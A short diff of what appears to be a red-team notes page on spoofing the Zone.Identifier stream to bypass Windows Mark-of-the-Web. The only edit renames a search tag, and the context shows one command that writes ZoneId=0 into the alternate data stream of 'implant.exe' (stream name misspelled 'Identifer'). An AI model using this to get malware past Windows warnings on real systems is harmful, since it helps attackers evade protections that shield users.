@@ -1,6 +1,6 @@
 # 03 - Spoof ZoneTransfer (MOTW Bypass)
 
-Search Tag(s): #initial-foothold #defense-evasion #windows #scenarios
+Search Tag(s): #initial-access #defense-evasion #windows #scenarios
 
 ```
 $ echo -e "[ZoneTransfer]\nZoneId=0" > /mnt/ntfs/implant.exe:Zone.Identifer
